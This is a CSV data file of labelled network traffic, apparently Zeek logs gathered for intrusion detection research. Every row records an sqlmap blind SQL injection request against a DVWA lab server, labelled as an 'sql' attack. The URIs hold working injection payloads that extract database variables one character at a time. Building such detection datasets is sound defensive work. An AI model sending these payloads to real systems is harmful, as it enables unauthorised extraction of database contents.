ts_x,uid,id.orig_h_x,id.orig_p_x,id.resp_h_x,id.resp_p_x,proto,service,duration_x,orig_bytes,resp_bytes,conn_state,local_orig_x,local_resp,missed_bytes,history,orig_pkts,orig_ip_bytes,resp_pkts,resp_ip_bytes,tunnel_parents,ip_proto,ts_y,trans_depth,method,host,uri,referrer,version,user_agent,origin,request_body_len,response_body_len,status_code,status_msg,info_code,info_msg,tags,username,password,proxied,orig_fuids,orig_filenames,orig_mime_types,resp_fuids,resp_filenames,resp_mime_types,ts,fuid,source,depth,analyzers,mime_type,filename,duration_y,local_orig_y,is_orig,seen_bytes,total_bytes,missing_bytes,overflow_bytes,timedout,parent_fuid,md5,sha1,sha256,extracted,extracted_cutoff,extracted_size,attack_cat,label
1761395930,Cqrvas4bLcupbbuks7,10.0.0.85,33848,10.0.0.88,80,tcp,http,0.046185,641,1939,SF,T,T,1939,ShADacgfF,5,909,4,216,-,6,1761395930.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),29,1))>83-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395931,CN26Ha2PSa1i46WFNl,10.0.0.85,34002,10.0.0.88,80,tcp,http,0.043545,641,1729,SF,T,T,1729,ShADacgfF,5,909,4,216,-,6,1761395931.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_VALUE AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),3,1))>64-- kzik&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,CylKYP1txZBF6IgoYe,10.0.0.85,38308,10.0.0.88,80,tcp,http,0.03081,640,1938,SF,T,T,1938,ShADacfgF,5,908,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),6,1))>80-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395928,CKI9XE1iNK8WmnTlr4,10.0.0.85,33202,10.0.0.88,80,tcp,http,0.020516,641,1729,SF,T,T,1729,ShADacfgF,5,909,4,216,-,6,1761395928.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),20,1))>92-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395932,CQdj0pjqM8wxYfBx3,10.0.0.85,38158,10.0.0.88,80,tcp,http,0.035326,640,1940,SF,T,T,1940,ShADacgfF,5,908,4,216,-,6,1761395932.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 486,1),3,1))>76-- nhDV&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395930,CDnxQq3iAozhROVpla,10.0.0.85,33820,10.0.0.88,80,tcp,http,0.030423,641,1939,SF,T,T,1939,ShADacfgF,5,909,4,216,-,6,1761395930.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),31,1))>70-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CqtYvSQSTN8fXeZ3a,10.0.0.85,33262,10.0.0.88,80,tcp,http,0.014125,641,1939,SF,T,T,1939,ShADacgfF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),22,1))>96-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395930,CcXMo231X6oq3MTbz9,10.0.0.85,33920,10.0.0.88,80,tcp,http,0.03745,641,1938,SF,T,T,1938,ShADacgfF,5,909,4,216,-,6,1761395930.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),32,1))>82-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CPHCHB3xQkbs9lr4G,10.0.0.85,33402,10.0.0.88,80,tcp,http,0.022364,641,1938,SF,T,T,1938,ShADacfgF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),24,1))>72-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395931,CwaGtY3tuZuPadxXAe,10.0.0.85,34106,10.0.0.88,80,tcp,http,0.073174,641,1729,SF,T,T,1729,ShADacgfF,5,909,4,216,-,6,1761395931.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_VALUE AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),2,1))>68-- kzik&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395930,CKTbAzmew30x4KYx4,10.0.0.85,33608,10.0.0.88,80,tcp,http,0.020898,641,1729,SF,T,T,1729,ShADacgfF,5,909,4,216,-,6,1761395930.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),26,1))>94-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
1761395929,CDEqhm4ASzhmAO7icg,10.0.0.85,33314,10.0.0.88,80,tcp,http,0.028089,641,1938,SF,T,T,1938,ShADacgfF,5,909,4,216,-,6,1761395929.0,1.0,POST,10.0.0.88,"/DVWA/vulnerabilities/sqli/?id=111' OR NOT ORD(MID((SELECT IFNULL(CAST(VARIABLE_NAME AS NCHAR),0x20) FROM information_schema.GLOBAL_VARIABLES ORDER BY VARIABLE_NAME LIMIT 485,1),21,1))>68-- xPpn&Submit=Submit",http://10.0.0.88/DVWA/vulnerabilities/sqli/,-,sqlmap/1.9.10.5#dev (https://sqlmap.org),-,0.0,0.0,-,-,-,-,(empty),-,-,-,-,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,sql,1
